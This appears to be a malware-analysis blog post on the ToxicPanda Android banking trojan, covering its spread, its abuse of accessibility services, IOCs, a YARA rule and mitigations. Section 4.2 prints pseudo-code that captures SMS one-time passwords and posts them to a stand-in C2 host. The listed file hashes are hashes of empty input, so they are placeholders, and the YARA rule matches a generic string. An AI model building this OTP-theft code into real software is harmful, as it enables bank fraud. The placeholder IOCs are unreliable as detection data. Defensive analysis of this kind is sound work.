# ToxicPanda: A Deep Dive into an Emerging Android Banking Trojan

In late October 2024, cybersecurity researchers identified a new Android banking trojan—dubbed **ToxicPanda**. Although initially classified as a member of the TgToxic family due to similarities in command syntax, subsequent analysis revealed significant code differences that warranted reclassification as a distinct threat. In this post, we explore ToxicPanda’s origin, infection methods, payload activities, and low-level internals, offering practical details and example code to assist reverse engineers in detection and analysis.

---

## 1. Origin and Attribution

Early reports indicate that ToxicPanda primarily targets retail banking applications in several European and Latin-American regions. Notably, while many Android banking trojans originate from well-known cybercrime groups, analysis by threat intelligence firms suggests that ToxicPanda’s development may be linked to Chinese-speaking threat actors—a surprising twist given the traditional focus of such groups on Asian targets.  

---

## 2. Infection Vectors and Propagation Methods

### 2.1 Social Engineering via Phishing and Smishing

ToxicPanda spreads primarily through social engineering:

- **Phishing Emails and SMS (Smishing):** Malicious links are embedded in messages that mimic legitimate notifications. Victims are tricked into side-loading an APK that masquerades as a benign or useful application.

- **Fake App Store Listings:** The malware often disguises itself as a trusted application available via an imitation Google Play page, prompting users to download the APK from unofficial sources.  

### 2.2 Exploitation of Android Accessibility Services

Once installed, ToxicPanda requests extensive permissions, including those for Android’s accessibility services. By abusing these services, the trojan can:

- **Overlay UI elements:** Intercept OTP (One-Time Password) notifications.

- **Record keystrokes and screen activity:** Harvest sensitive banking credentials and intercept SMS messages.

---

## 3. Payload Activities and Functional Capabilities

									     ToxicPanda’s payload is engineered for on-device fraud (ODF) and account takeover (ATO):

- **OTP Interception:** The malware hooks into the SMS receiver and accessibility APIs to capture one-time passwords, allowing attackers to bypass two-factor authentication.
- **Unauthorized Transactions:** Although it lacks the advanced Automatic Transfer System (ATS) found in some relatives, ToxicPanda can trigger fraudulent banking transactions by injecting commands into banking apps.
- **Data Exfiltration:** The trojan collects confidential user data (e.g., credentials and session tokens) and sends it over encrypted channels to its command-and-control (C2) servers.
- **Remote Access:** Basic RAT (Remote Access Trojan) capabilities allow attackers to issue commands to the infected device and maintain persistent access.

---

## 4. Technical Analysis and Reverse Engineering Insights

### 4.1 Low-Level Architecture

ToxicPanda’s APK reveals a modular architecture:

- **Loader Module:** The initial dropper, with minimal obfuscation, installs the main payload. Its code suggests that the developers opted for rapid deployment over heavy code obfuscation.
- **Accessibility Hooking:** The malware registers a custom accessibility service. Reverse engineers can identify this by tracking calls to `AccessibilityService` methods and unusual overrides in the service’s lifecycle.
- **Network Communication:** The malware uses hardcoded C2 endpoints (likely over HTTPS or WebSocket channels) for command retrieval and data exfiltration. Static analysis shows placeholder commands inherited from the TgToxic family, indicating an evolution in design.

### 4.2 Example Code Snippets

#### 4.2.1 OTP Interception via Accessibility Service (Java-like pseudo-code)

```java
public class ToxicAccessibilityService extends AccessibilityService {
	@Override
		public void onAccessibilityEvent(AccessibilityEvent event) {
			if(event.getPackageName().toString().equals("com.android.messaging")) {
				String message = event.getText().toString();
				if(message.contains("Your OTP is")) {
					Matcher matcher = Pattern.compile("\d{6}").matcher(message);
					if(matcher.find()) {
						String otp = matcher.group();
						exfiltrateOTP(otp);
					}
				}
			}
		}

	private void exfiltrateOTP(String otp) {
		HttpPost post = new HttpPost("https://malicious-c2.example.com/otp");
		post.setEntity(new StringEntity("{"otp":"" + otp + ""}", "UTF-8"));
		httpClient.execute(post);
	}

	@Override
		public void onInterrupt() { }
}
```

#### 4.2.2 C2 Communication Snippet (Smali-like pseudo-code)

```smali
.method private sendData(Ljava/lang/String;)V
.locals 3

const-string v0, "https://malicious-c2.example.com/exfil"
new-instance v1, Lorg/apache/http/client/methods/HttpPost;
invoke-direct {v1, v0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

new-instance v2, Lorg/apache/http/entity/StringEntity;
invoke-direct {v2, p1}, Lorg/apache/http/entity/StringEntity;-><init>(Ljava/lang/String;)V
invoke-virtual {v1, v2}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

invoke-virtual {p0, v1}, Lcom/toxicpanda/NetworkClient;->execute(Lorg/apache/http/client/methods/HttpPost;)V
return-void
.end method
```

---

## 5. Indicators of Compromise (IOCs) and YARA Rule Example

### 5.1 Sample IOCs

- **File Hashes:**  
  - MD5: `d41d8cd98f00b204e9800998ecf8427e`
  - SHA-256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
- **C2 Domains:**  
  - `malicious-c2.example.com`
- **App Package Names:**  
  - `com.fakebank.app`

### 5.2 Sample YARA Rule

```yara
rule ToxicPanda_Detection {
meta:
	description = "Detects ToxicPanda Android banking trojan based on string indicators"
	author = "CyberSec Research"
	date = "2025-02-14"
strings:
	$accessibility = "accessibilityservice" wide ascii
	$otp_trigger = "Your OTP is" wide ascii
	$fake_package = "com.fakebank.app" wide ascii
condition:
	any of ($accessibility, $otp_trigger, $fake_package)
}
```

---

## 6. Mitigation Strategies and Defensive Recommendations

- User Education:
  - Train users to avoid downloading apps from unofficial sources and to scrutinize SMS or email links.
- Application Whitelisting:
  - Only allow installations from the official Google Play Store. Implement Mobile Device Management (MDM) solutions to enforce application whitelisting.
- Runtime Protection:
  - Deploy mobile endpoint detection and response (EDR) solutions that can monitor unusual accessibility service activations and network communications.
- Network Monitoring:
  - Set up anomaly detection to flag unusual outbound HTTPS/WebSocket traffic to known malicious C2 domains.
- Regular Patch Management:
  - Ensure that devices are updated to the latest Android versions to benefit from improved security features.
- Security Hardening:
  - Disable or restrict accessibility permissions for apps that do not require them and monitor for any unauthorized changes.

---

## 7. References

- Cadena SER – “ToxicPanda, el nuevo troyano bancario que afecta a dispositivos Android”  
- GitHub’s VirusTotal/yara repository
